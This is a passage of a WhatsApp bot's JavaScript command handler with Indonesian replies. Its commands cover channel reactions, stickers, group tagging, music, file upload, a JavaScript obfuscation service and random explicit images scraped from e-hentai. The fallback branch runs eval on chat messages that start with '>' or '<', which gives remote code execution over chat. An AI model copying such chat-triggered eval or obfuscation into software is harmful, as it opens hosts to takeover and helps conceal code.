      const args = body.trim().split(/ +/).slice(1);
      if (args.length < 3) return m.reply("Format salah! Gunakan: .reactch,idsaluran, message_id, emoji1, emoji2");

      const formattedArgs = args.join(",").split(",");
      if (formattedArgs.length < 3) return m.reply("Format salah! Gunakan: .reactch,idsaluran,message_id,emoji1,emoji2");

      const channelId = formattedArgs[0];
      const messageId = formattedArgs[1];
      const emojis = formattedArgs.slice(2);

      try {
        for (const emoji of emojis) {
          await syah.newsletterReactMessage(channelId, messageId, emoji);
          await new Promise(resolve => setTimeout(resolve, 1000));
        }

        m.reply(`✅ Berhasil mengirim reaksi ke pesan ${messageId} di saluran ${channelId}.\nReaksi: ${emojis.join(", ")}`);
      } catch (error) {
        console.error("Gagal mengirim reaksi:", error);
        m.reply("❌ Gagal mengirim reaksi. Pastikan ID saluran dan pesan benar.");
      }
    }
    break

case "brat": {;
             const text = q
if (!text) return replygw(
`*[ ! ] Unexpected Command!!*
*Use:* ${prefix + command} build Sigma`);
             replygw(`*Brat Feature Process!...*`);
const imageUrl = `https://brat.caliphdev.com/api/brat?text=${encodeURIComponent(text)}`;
const inputPath = path.join(__dirname, "temp_image.jpg");
const outputPath = path.join(__dirname, "sticker.webp");

try {
const response = await axios.get(imageUrl, { responseType: "arraybuffer" });
fs.writeFileSync(inputPath, response.data);
exec(`ffmpeg -i ${inputPath} -vf "scale=512:512:force_original_aspect_ratio=decrease" -c:v libwebp -lossless 1 -q:v 80 -preset default -an -vsync 0 ${outputPath}`, async (error) => {
if (error) {
console.error("Gagal mengonversi gambar:", error);
return await replygw("Gagal membuat stiker");
}
await syah.sendMessage(m.chat, { 
sticker: fs.readFileSync(outputPath),
}, { quoted: m });
fs.unlinkSync(inputPath);
fs.unlinkSync(outputPath);
});
} catch (error) {
console.error("Gagal membuat stiker:", error);
await replygw("Gagal membuat stiker");
}
}
break;

case "cekidch": case "idch": {
if (!text) return m.reply(("linkchnya mana goblok"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await syah.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Verif"}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy ID Channel\",\"id\":\"123456789\",\"copy_code\":\"${res.id}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m})
await syah.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break;

case "hidetag": case "tagall": case "h":  {
if (!isCreator) return replygw("Owner only.");
if (!text) return replygw(`teks nya mana?`)
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
syah.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break;

case 'tes':
case 'bot': {
replygw(`*BOTNAME*: *VORTUNIX INFINITY*
*VERSION*: 4.0
*STATUS*:ACTIVATED`)
}
break;

case "play":{            
                if (!text) return replygw(`\n*ex:* ${prefix + command} impossible\n`)
                replygw(`*\`SEBENTAR YA KAK.\`*`)
                let mbut = await fetchJson(`https://ochinpo-helper.hf.space/yt?query=${text}`)
                let ahh = mbut.result
                let crot = ahh.download.audio

                syah.sendMessage(m.chat, {
                    audio: { url: crot },
                    mimetype: "audio/mpeg", 
                    ptt: true
                }, { quoted: m })
            }
            break;         
            
case "enchard": case "encrypthard": {
if (!m.quoted) return replygw("Reply file .js")
if (mime !== "application/javascript") return reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.caption
await fs.writeFileSync(`./@hardenc${filename}.js`, media)
await replygw("Memproses encrypt hard code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${filename}.js`).toString(), {
  target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "/*Shaa/*^/*($break)*/" + 
            "/*Shaa/*^/*($break)*/";

        function hapusKarakterTidakDiinginkan(input) {
            return input.replace(
                /[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, ''
            );
        }

        function stringAcak(panjang) {
            let hasil = '';
            const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            const panjangKarakter = karakter.length;

            for (let i = 0; i < panjang; i++) {
                hasil += karakter.charAt(
                    Math.floor(Math.random() * panjangKarakter)
                );
            }
            return hasil;
        }

        return hapusKarakterTidakDiinginkan(originalString) + stringAcak(2);
    },

    renameVariables: true,
    renameGlobals: true,

    // Kurangi encoding dan pemisahan string untuk mengoptimalkan ukuran
    stringEncoding: 0.01, 
    stringSplitting: 0.1, 
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: true,

    shuffle: {
        hash: false,
        true: false
    },

    stack: false,
    controlFlowFlattening: false, 
    opaquePredicates: false, 
    deadCode: false, 
    dispatcher: false,
    rgf: false,
    calculator: false,
    hexadecimalNumbers: false,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@hardenc${filename}.js`, obfuscated)
  await syah.sendMessage(m.chat, {document: fs.readFileSync(`./@hardenc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\nString"}, {quoted: m})
}).catch(e => replygw("Error :" + e))
await fs.unlinkSync(`./@hardenc${filename}.js`)
}
break;


case 'hentai': {
 syah.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
try {
async function scrapeData() {
    try {
const page = Math.floor(Math.random() * 50);
        const { data } = await axios.get('https://e-hentai.org/tag/random?prev=' + page);
        const $ = cheerio.load(data);
        const results = [];
        $('.glthumb').each((index, element) => {
            const img = $(element).find('img');
            const imgSrc = img.attr('data-src');
            
            if (imgSrc) {
                results.push(imgSrc);
            }
        });
        return results
    } catch (error) {
        console.error('Error fetching data:', error);
    }
}
function getRandomElement(array) {
    const randomIndex = Math.floor(Math.random() * array.length);
    return array[randomIndex];
}
const jmebut = await scrapeData()
const randomUrl = getRandomElement(jmebut);
syah.sendMessage(m.chat, { caption: m.success, image: { url: randomUrl } }, { quoted: m })
  } catch (error) {
    return replygw(`💥 Terjadi kesalahan saat mengambil data: ${error.message}`);
  }
}
break;  
case 'tourl' : {
 const fetch = require('node-fetch');
 const FormData = require('form-data');
 const q = m.quoted ? m.quoted : m;
 const mimetype = (q.msg || q).mimetype || q.mediaType || '';
 if (!/webp/.test(mimetype)) {
 syah.sendMessage(m.chat, {
 react: {
 text: '🕒',
 key: m.key,
 }
 });

 try {
 const media = await q.download?.();
 const fileSizeInBytes = media.length;
 const fileSizeInKB = (fileSizeInBytes / 1024).toFixed(2);
 const fileSizeInMB = (fileSizeInBytes / (1024 * 1024)).toFixed(2);
 const fileSize = fileSizeInMB >= 1 ? `${fileSizeInMB} MB` : `${fileSizeInKB} KB`;
 const form = new FormData();
 form.append('reqtype', 'fileupload');
 let ext = mimetype.split('/')[1] || '';
 if (ext) ext = `.${ext}`;
 form.append('fileToUpload', media, `file${ext}`);
 const res = await fetch('https://catbox.moe/user/api.php', {
 method: 'POST',
 body: form
 });
 const result = await res.text();
 const url = result.trim();
 const caption = `🔗 URL: ${url}\n\n*Ukuran:* ${fileSize}`;
 // Tombol interaktif
            const teks = caption;
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: {
                            body: {
                                text: teks
                            },
                            footer: {
                                text: "© WhatsApp Bots - 2025"
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text": "SALIN LINK","copy_code": "${url}"}`
                                    },
                                ],
                            },
                        },
                    },
                },
            }, { quoted: m });

            await syah.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
 
 } catch (e) {
 console.error(e);
 m.reply(`[ ! ] Gagal mengunggah file. Error: ${e.message}`);
 }
 } else {
 m.reply(`File *.webp* tidak didukung. Kirim atau reply file lain dengan caption *${prefix + command}*`);
 }
};
 break
 
async function CatBox(filePath) {
	try {
		const fileStream = fs.createReadStream(filePath);
		const formData = new BodyForm();
		formData.append('fileToUpload', fileStream);
		formData.append('reqtype', 'fileupload');
		formData.append('userhash', '');
		const response = await axios.post('https://catbox.moe/user/api.php', formData, {
			headers: {
				...formData.getHeaders(),
			},
		});
		return response.data;
	} catch (error) {
		console.error("Error at Catbox uploader:", error);
		return "Terjadi kesalahan saat upload ke Catbox.";
	}
};
// END CASE MD/ADD

default:
if (budy.startsWith('>')) {
if (!isAcces) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}

if (budy.startsWith('<')) {
if (!isAcces) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});